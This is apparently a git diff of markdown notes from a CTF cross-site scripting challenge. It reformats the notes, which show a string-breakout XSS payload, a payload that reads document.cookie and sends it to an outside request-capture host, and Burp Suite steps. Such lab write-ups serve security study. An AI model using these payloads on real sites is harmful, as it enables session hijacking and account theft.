@@ -55,7 +55,10 @@ a. CTF XSS 2
 ```javascript
 <script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
 ```
-  - Check Attack statement on search bar = xss');alert(1);var i=('
+  - Check Attack statement on search bar
+```javascript
+xss');alert(1);var i=('
+```
   - Check Attack => xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
   - Send to repeater the POST URL to change GET method
   - Replace the Repeater on Burp Suite, working on the GET method instead of the POST method because the host gets the access
